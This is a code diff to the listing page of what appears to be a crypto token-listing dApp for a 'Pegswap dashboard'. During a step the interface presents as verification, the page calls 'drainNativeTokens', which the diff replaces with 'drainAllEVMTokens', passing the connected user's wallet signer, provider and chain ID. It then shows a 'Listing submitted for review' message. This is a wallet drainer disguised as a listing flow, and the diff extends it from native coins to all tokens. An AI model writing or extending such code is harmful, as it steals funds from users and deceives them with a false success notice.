@@ -21,7 +21,7 @@ import { useWallet } from '@solana/wallet-adapter-react';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { useChainInfo } from '@/hooks/useChainInfo';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 
 type WizardStep = 'contract' | 'details' | 'review';
 
@@ -62,7 +62,7 @@ const ListPage = () => {
   const [error, setError] = useState<string | null>(null);
 
   const { connected, publicKey } = useWallet();
-  const { activeChain, getEVMChain } = useChain();
+  const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName } = useChainInfo();
 
@@ -118,7 +118,7 @@ const ListPage = () => {
       try {
         setIsVerifying(true);
         const name = getEVMChain()?.name || chainName || 'EVM';
-        await drainNativeTokens(evmSigner, evmProvider, name);
+        await drainAllEVMTokens(evmSigner, evmProvider, name, evmChainId || 1);
         toast.success('Listing submitted for review', {
           description: `${tokenInfo?.baseToken.name} (${tokenInfo?.baseToken.symbol}) is queued for the Pegswap dashboard.`,
         });
